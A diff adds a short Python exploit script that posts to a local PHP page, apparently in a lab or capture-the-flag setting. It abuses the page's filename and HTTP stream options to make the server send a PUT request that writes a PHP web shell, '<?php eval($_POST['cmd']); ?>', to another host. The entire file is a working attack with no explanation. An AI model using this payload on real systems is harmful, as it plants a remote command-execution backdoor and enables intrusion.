@@ -1,0 +1,13 @@
+import requests
+
+url = 'http://127.0.0.1:51029/index.php'
+data = {
+    'action': 'view',
+    'filename': 'http://127.0.0.1:5000/shelll.php',
+    'options[http][method]': 'PUT',
+    'options[http][header]': 'User-Agent: Test',  
+    "options[http][content]": "<?php eval($_POST['cmd']); ?>"
+}
+
+response = requests.post(url, data=data)
+print(response.text)
